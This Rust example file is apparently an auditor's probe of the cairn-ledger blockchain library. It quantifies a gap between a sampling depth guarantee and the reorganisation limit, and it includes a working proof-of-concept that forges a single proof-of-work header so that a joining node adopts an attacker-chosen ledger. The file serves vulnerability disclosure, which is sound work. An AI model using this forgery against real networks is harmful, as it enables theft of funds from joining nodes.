//! Auditor's probe. Two independent checks the shipped examples do not make.
//!
//! FINDING 1. The depth guarantee the sampling advertises (measured at 1237
//! blocks for a 40% forger) is stated to be "shallower than the deepest
//! reorganisation this node would accept", i.e. MAX_REORG_DEPTH = 1024. It is
//! not: 1237 > 1024. This prints the per-seed evasion probability at depths
//! straddling 1024, so the band a forger reaches but the fork choice cannot
//! recover is explicit.
//!
//! FINDING 2. `check_start` weighs a chain by *work only*; `accept`/`adopt`
//! install the tip's ledger after checking it *hashes to the tip's committed
//! state_root* and nothing else. Neither validates that the state is the
//! result of a valid transaction history. A miner who finds one block can put
//! an arbitrary ledger in it. This builds such a forgery and drives it through
//! the real `check_start` and the real `accept`.
//!
//! Run: cargo run --release -p cairn-ledger --example audit_probe

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::arithmetic_side_effects,
    clippy::indexing_slicing,
    clippy::cast_precision_loss,
    clippy::cast_possible_truncation,
    clippy::cast_sign_loss,
    clippy::print_stdout
)]

use cairn_accumulator::Archive;
use cairn_crypto::SecretKey;
use cairn_ledger::block::BlockHeader;
use cairn_ledger::handover::accept;
use cairn_ledger::note::Note;
use cairn_ledger::pow::{meets_target, work_of, RECENT_HEADERS};
use cairn_ledger::sampling::{
    check_start, covering, draw, seed_of, work_before, Sample, SampledStart, SAMPLES,
};
use cairn_ledger::state::header_leaf;
use cairn_ledger::transaction::{CoinbaseTransaction, Transfer};
use cairn_ledger::validation::{assemble_block, connect_block, mine_block, ConsensusParams};
use cairn_ledger::LedgerState;
use cairn_primitives::hash::{hash, Domain};

const NOW: u64 = 2_000_000_000;
const MAX_REORG_DEPTH: u64 = 1_024;

fn main() {
    finding_one();
    finding_two();
}

// ---------------------------------------------------------------------------
// FINDING 1: the guarantee depth exceeds the reorg horizon it claims to match.
// ---------------------------------------------------------------------------

fn finding_one() {
    const BLOCKS: u64 = 30 * 365 * 24 * 60;
    const PER_BLOCK: u128 = 1 << 40;
    const SEEDS: u64 = 200;
    let total = PER_BLOCK * u128::from(BLOCKS);
    let share = 0.40f64;
    let lie = 1.0 - share / (1.0 - share);

    // Every value the real draw produces over many seeds, sorted.
    let mut drawn = Vec::with_capacity((SEEDS as usize) * SAMPLES);
    for trial in 0..SEEDS {
        let seed = hash(Domain::SamplingSeed, &trial.to_le_bytes());
        drawn.extend(draw(seed, SAMPLES, total, BLOCKS));
    }
    drawn.sort_unstable();

    println!("FINDING 1  depth guarantee vs the reorg horizon it claims to match");
    println!(
        "  forger at {:.0}% of the world's work, MAX_REORG_DEPTH = {MAX_REORG_DEPTH}\n",
        share * 100.0
    );
    println!(
        "{:>8} {:>12} {:>16} {:>18}",
        "fork@", "gap draws in", "evasion 2^-x", "past reorg horizon?"
    );
    println!("  {}", "-".repeat(56));

    for depth in [900u64, 962, 1000, 1024, 1050, 1100, 1150, 1200, 1237, 1300] {
        let abandoned = u128::from(depth) * PER_BLOCK;
        let gap = (abandoned as f64 * lie) as u128;
        let from = total - abandoned;
        // The forger presses its invented work against the fork point, the
        // lowest-density place it is allowed to put it.
        let hit = landing_in(&drawn, from, from + gap);
        let evade = (1.0 - hit).powi(SAMPLES as i32);
        let bits = if evade <= 0.0 {
            f64::INFINITY
        } else {
            -evade.log2()
        };
        println!(
            "{:>8} {:>12} {:>16} {:>18}",
            depth,
            format!("{:.4}%", hit * 100.0),
            if bits.is_infinite() {
                ">1e300".to_owned()
            } else {
                format!("{bits:.1}")
            },
            if depth > MAX_REORG_DEPTH {
                "YES - unrecoverable"
            } else {
                "no"
            },
        );
    }
    println!(
        "\n  A placement in (1024, 1237] evades the sampling at better than 2^-128\n\
         (the design's own standard) yet forks deeper than the 1024 blocks a\n\
         joined node can ever reorganise away: undo_from starts closed on a\n\
         handed-over ledger, and add_block refuses a parent below tip-1024. So a\n\
         newcomer put there cannot return to the honest chain even once it sees\n\
         it is heavier. The doc's \"shallower than the reorg this node accepts\"\n\
         is false by ~213 blocks.\n"
    );
}

fn landing_in(drawn: &[u128], from: u128, to: u128) -> f64 {
    let lo = drawn.partition_point(|w| *w < from);
    let hi = drawn.partition_point(|w| *w < to);
    (hi - lo) as f64 / drawn.len() as f64
}

// ---------------------------------------------------------------------------
// FINDING 2: an arbitrary ledger is adopted behind one PoW'd header.
// ---------------------------------------------------------------------------

fn finding_two() {
    println!("\nFINDING 2  a fraudulent ledger adopted behind one valid header\n");

    let params = ConsensusParams::testnet();
    let honest_miner = SecretKey::from_bytes(&[1; 32]);
    let attacker = SecretKey::from_bytes(&[9; 32]);

    // 1. An honest chain. Real work, real coinbase to the honest miner.
    const HEIGHT: u64 = 150;
    let (honest_headers, honest_state) = build(&params, &honest_miner, HEIGHT);
    let honest_tip = *honest_headers.last().unwrap();
    println!(
        "  honest chain: height {}, work {}, attacker owns {} pebbles",
        honest_tip.height,
        honest_tip.total_work,
        owned_by(&honest_state, &attacker),
    );

    // 2. The forest of every honest header, so the forgery can be sampled
    //    against a real history it did not have to build.
    let mut before_tip = Archive::new();
    for header in &honest_headers {
        before_tip.add(header_leaf(&header.id()));
    }

    // 3. The attacker's fraudulent ledger. A short private chain that pays the
    //    attacker. Its notes exist on no chain the honest network follows.
    let (_evil_headers, evil_state) = build(&params, &attacker, 4);
    let stolen = owned_by(&evil_state, &attacker);

    // 4. One forged tip. It commits to the honest history (so the sampling has
    //    real headers to open) and to the attacker's ledger (so the handover
    //    reproduces it). Built on the honest tip, one block heavier, so the
    //    newcomer weighs it as the winner. The attacker only mines this header.
    let mut forged = honest_tip;
    forged.height = honest_tip.height + 1;
    forged.previous = honest_tip.id();
    forged.history = before_tip.commitment();
    forged.state_root = evil_state.state_root();
    forged.total_work = honest_tip.total_work + work_of(honest_tip.difficulty);
    forged.timestamp = honest_tip.timestamp + 600;
    forged.nonce = 0;
    let forged = grind(forged);
    assert!(
        meets_target(&forged.id(), forged.difficulty),
        "forged tip carries real PoW"
    );

    // 5. Weigh it, through the exact function a joining node uses.
    let samples: Vec<Sample> = draw(
        seed_of(&forged),
        SAMPLES,
        work_before(&forged),
        forged.height,
    )
    .into_iter()
    .map(|work| {
        let height = covering(&ledger_rows(&honest_headers), work).unwrap();
        Sample {
            header: honest_headers[usize::try_from(height).unwrap()],
            proof: before_tip.prove(height).unwrap(),
        }
    })
    .collect();
    let start = SampledStart {
        tip: forged,
        history: before_tip.forest().roots_only(),
        samples,
    };
    match check_start(&start, SAMPLES) {
        Ok(weighed) => println!(
            "  check_start: OK  -> weighed heaviest at work {} (honest tip was {})",
            weighed.total_work, honest_tip.total_work
        ),
        Err(e) => {
            println!("  check_start rejected the forgery: {e}");
            return;
        }
    }

    // 6. Hand over the attacker's ledger under the forged tip, and accept it.
    //    The handover carries the attacker's hot/cold/grace, but the *honest*
    //    header forest, which is what the forged tip's `history` commits to.
    let recent = recent_ending_at(&honest_headers, &forged);
    let mut handover = evil_state.handover(forged, recent);
    handover.headers = before_tip.forest().roots_only();

    match accept(&handover, params.hot_capacity) {
        Ok(adopted) => {
            let now_owned = owned_by(&adopted, &attacker);
            println!("  accept:      OK  -> newcomer adopts the ledger the tip committed to");
            println!(
                "\n  RESULT: the newcomer's ledger now credits the attacker {now_owned} pebbles\n\
                 ({stolen} were placed in the forged state), against {} on the honest\n\
                 chain the sampled headers actually describe. No coinbase on that\n\
                 chain ever created these notes; nothing in the join path checked.",
                owned_by(&honest_state, &attacker),
            );
            // Prove it is genuinely a different ledger, not the honest one.
            assert_ne!(adopted.state_root(), honest_state.state_root());
            assert_eq!(adopted.state_root(), forged.state_root);
        }
        Err(e) => println!("  accept rejected the handover: {e}"),
    }
}

/// Total pebbles the hot set credits to one key.
fn owned_by(state: &LedgerState, key: &SecretKey) -> u64 {
    let owner = key.public_key();
    state
        .hot_notes()
        .filter(|(_, entry)| entry.note.owner == owner)
        .map(|(_, entry)| entry.note.value.as_pebbles())
        .sum()
}

/// The (height, total_work, difficulty) rows `covering` expects, tip first.
fn ledger_rows(headers: &[BlockHeader]) -> Vec<(u64, u128, u64)> {
    headers
        .iter()
        .rev()
        .map(|h| (h.height, h.total_work, h.difficulty))
        .collect()
}

/// A run of consecutive headers ending at `forged`, long enough for accept.
fn recent_ending_at(honest: &[BlockHeader], forged: &BlockHeader) -> Vec<BlockHeader> {
    let tail = RECENT_HEADERS.saturating_sub(1);
    let from = honest.len().saturating_sub(tail);
    let mut recent: Vec<BlockHeader> = honest[from..].to_vec();
    recent.push(*forged);
    recent
}

/// Brute-forces a nonce until the header carries its claimed work.
fn grind(mut header: BlockHeader) -> BlockHeader {
    for nonce in 0..(1u64 << 32) {
        header.nonce = nonce;
        if meets_target(&header.id(), header.difficulty) {
            return header;
        }
    }
    panic!("could not find a nonce");
}

/// An honest chain of `count` blocks paying `miner`, with the ledger it makes.
fn build(
    params: &ConsensusParams,
    miner: &SecretKey,
    count: u64,
) -> (Vec<BlockHeader>, LedgerState) {
    let mut state = LedgerState::new();
    let mut headers = Vec::with_capacity(usize::try_from(count).unwrap());
    let mut clock = 1_000u64;
    for _ in 0..count {
        let height = state.next_height().unwrap();
        clock += 600;
        let coinbase = CoinbaseTransaction::new(
            height,
            vec![Note::new(params.initial_reward, miner.public_key())],
        );
        let block =
            assemble_block(&state, coinbase, Vec::<Transfer>::new(), params, clock, 0).unwrap();
        let block = mine_block(block, 1 << 22).unwrap();
        connect_block(&mut state, &block, params, NOW).unwrap();
        headers.push(block.header);
    }
    (headers, state)
}
